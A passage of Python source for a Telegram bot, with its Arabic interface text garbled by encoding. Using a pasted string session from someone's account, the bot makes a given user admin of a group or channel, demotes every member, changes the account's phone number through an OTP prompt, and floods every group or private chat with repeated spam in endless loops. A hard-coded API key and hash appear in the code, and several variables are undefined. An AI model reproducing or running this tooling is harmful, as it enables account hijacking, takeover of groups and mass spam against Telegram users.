      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ÿßŸÑŸäŸàÿ≤ÿ±  ÿÆÿßÿµ ÿ®ŸÉ")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("ÿ£ŸÜÿß ÿ£ŸÇŸàŸÖ ÿ®ÿ±ŸÅÿπŸÉ ŸÅŸä ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ© ÿå ÿßŸÜÿ™ÿ∏ÿ± ÿØŸÇŸäŸÇÿ© üòóüòó\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi .", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      await x.send_message("ÿ£ÿπÿ∑Ÿê ÿßŸÑÿ¢ŸÜ ŸäŸàÿ≤ÿ± ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ©")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("ÿßŸÇŸàŸÖ ÿ®ÿ™ŸÜÿ≤ŸäŸÑ ÿ¨ŸÖŸäÿπ ÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ© ÿå ÿßŸÜÿ™ÿ∏ÿ± ÿØŸÇŸäŸÇÿ© üòóüòó\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi .", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      await x.send_message("ÿ£ÿπÿ∑ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØ ÿ™ÿ∫ŸäŸäÿ±Ÿá \ n [ŸÖŸÑÿßÿ≠ÿ∏ÿ©: ŸÑÿß ÿ™ÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿßÿ±ŸÇÿßŸÖ ÿßŸÑŸàŸáŸÖŸäŸá ÿ£Ÿà ÿßŸÉÿ™ÿ® ÿßŸÑÿ¢ŸÜ ÿ£ÿ±ŸÇÿßŸÖŸãÿß] \ n [ÿ•ÿ∞ÿß ŸÉŸÜÿ™ ÿ™ÿ≥ÿ™ÿÆÿØŸÖ ÿ™ÿ∑ÿ®ŸäŸÇ ÿßÿ±ŸÇÿßŸÖ ŸàŸáŸÖŸäŸá ÿ£Ÿà ÿßŸÑŸÜÿµ ÿßŸÑÿ¢ŸÜ ÿå ŸÅŸÑÿß ŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ŸÉŸàÿØ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n ÿßŸÜÿ≥ÿÆ ÿ™ÿ¨ÿ≤ÿ¶ÿ© ÿ±ŸÖÿ≤ ÿßŸÑŸáÿßÿ™ŸÅ Ÿàÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿ±ŸÇŸÖŸÉ ÿßŸÑÿ∞Ÿä ÿ≠ÿµŸÑÿ™ ÿπŸÑŸäŸá \ n ÿ£ÿ™ŸàŸÇŸÅ ŸÑŸÖÿØÿ© 20 ÿ´ÿßŸÜŸäÿ© ÿßŸÜÿ≥ÿÆ ÿ™ÿ¨ÿ≤ÿ¶ÿ© ÿ±ŸÖÿ≤ ÿßŸÑŸáÿßÿ™ŸÅ Ÿà ŸÉŸàÿØ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ")
        await asyncio.sleep(20)
        await x.send_message("ÿ£ÿπÿ∑ ÿßŸÑÿ¢ŸÜ ÿ™ÿ¨ÿ≤ÿ¶ÿ© ÿ±ŸÖÿ≤ ÿßŸÑŸáÿßÿ™ŸÅ")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿ±ŸÇŸÖ ÿßŸÑÿ™ŸáÿßŸÜŸä")
        else:
          await event.respond("ŸáŸÜÿßŸÉ ÿ¥ÿ¶ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠")
      except Exception as e:
        await event.respond("ÿ£ÿ±ÿ≥ŸÑ Ÿáÿ∞ÿß ÿßŸÑÿÆÿ∑ÿ£ ÿ•ŸÑŸâ - @SESSIONSUPPORT\n**LOGS**\n" + str(e))



@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def start(event):
    keyboard = [
      [  
        Button.inline("a", data="a"), 
        Button.inline("b", data="b"),
        Button.inline("c", data="c"),
        ],
      [
        Button.url("Owner", "https://t.me/B_8_1")
        ]
    ]
    await event.reply("ÿßŸÑÿßŸÜ ÿßÿÆÿ™ÿßÿ± ŸÜŸàÿπ ÿßŸÑÿßÿ∞ÿßÿπŸá \n‚úì ŸÑŸÑŸÇŸÜŸàÿßÿ™ Ÿà ŸÉÿ±Ÿàÿ®ÿßÿ™ Ÿà ÿßŸÑÿÆÿßÿµ - ÿßÿÆÿ™ÿ± <a>\n‚úì ŸÑŸÑŸÉÿ±Ÿàÿ®ÿßÿ™ - ÿßÿÆÿ™ÿ± <b>\n‚úì ŸÑŸÑÿÆÿßÿµ - ÿßÿÆÿ™ÿ± <c>", buttons=keyboard)



async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if lol != -1001551357238:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)        


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      await x.send_message("NOW GIVE MSG")
      msg = await x.get_response()
      await x.send_message("ÿ™ŸÖ ÿßŸÑÿ¢ŸÜ Ÿàÿ≥Ÿäÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß ŸÉŸÑ 10 ÿØŸÇÿßÿ¶ŸÇ")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"ÿßŸÑÿßŸÜ Ÿäÿ™ŸÖ ÿßŸÑÿßÿ∞ÿßÿπŸá ŸÅŸä {i} ŸÇŸÜŸàÿßÿ™ Ÿà ŸÉÿ±Ÿàÿ®ÿßÿ™ Ÿà ÿÆÿßÿµ üòóüòó\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi .", buttons=keyboard)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001606996743:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001606996743:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿπÿ∑ŸÜŸä ÿßŸÑÿ±ÿ≥ÿßŸÑŸá")
      msg = await x.get_response()
      await x.send_message("ÿ™ŸÖ ÿßŸÑÿ¢ŸÜ Ÿàÿ≥Ÿäÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß ŸÉŸÑ 10 ÿØŸÇÿßÿ¶ŸÇ")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"ÿßŸÑÿßŸÜ Ÿäÿ™ŸÖ ÿßŸÑÿßÿ∞ÿßÿπŸá ŸÅŸä {i} ŸÉÿ±Ÿàÿ®ÿßÿ™ üòóüòó\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi .", buttons=keyboard)

async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        while molc != False:
                            await asyncio.sleep(10)
                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n /zi", buttons=keyboard)
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿπÿ∑ŸÜŸä ÿßŸÑÿ±ÿ≥ÿßŸÑŸá")
      msg = await x.get_response()
      await x.send_message("ÿ™ŸÖ ÿßŸÑÿ¢ŸÜ Ÿàÿ≥Ÿäÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß ŸÉŸÑ 10 ÿØŸÇÿßÿ¶ŸÇ")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f"ÿßŸÑÿßŸÜ Ÿäÿ™ŸÖ ÿßŸÑÿßÿ∞ÿßÿπŸá ŸÅŸä {i} ÿßŸÑÿÆÿßÿµüòóüòó\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/hack .", buttons=keyboard)

print("‚öúÔ∏è ÿ™ŸÖ ÿ™ŸÜÿµŸäÿ® ÿßŸÑÿ®Ÿàÿ™ ÿ®ŸÜÿ¨ÿßÿ≠ ‚öúÔ∏è Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ @SESSIONSUPPORT")
client.run_until_disconnected()
